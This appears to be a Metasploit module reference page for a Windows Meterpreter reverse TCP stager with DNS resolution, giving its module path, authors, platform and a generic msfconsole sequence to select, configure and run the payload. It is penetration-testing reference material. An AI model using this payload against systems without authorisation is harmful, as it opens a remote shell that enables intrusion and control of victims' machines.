## Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (DNS)

Inject the meterpreter server DLL (staged). Connect back to 
the attacker


## Module Name
payload/windows/patchupmeterpreter/reverse_tcp_dns

## Authors
* skape
* jt <jt@klake.org>
* hdm
* sf





## Platforms
* win

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/windows/patchupmeterpreter/reverse_tcp_dns
msf payload(reverse_tcp_dns) > show targets
   ... a list of targets ...
msf payload(reverse_tcp_dns) > set TARGET <target-id>
msf payload(reverse_tcp_dns) > show options
   ... show and set options ...
msf payload(reverse_tcp_dns) > run
```
    
    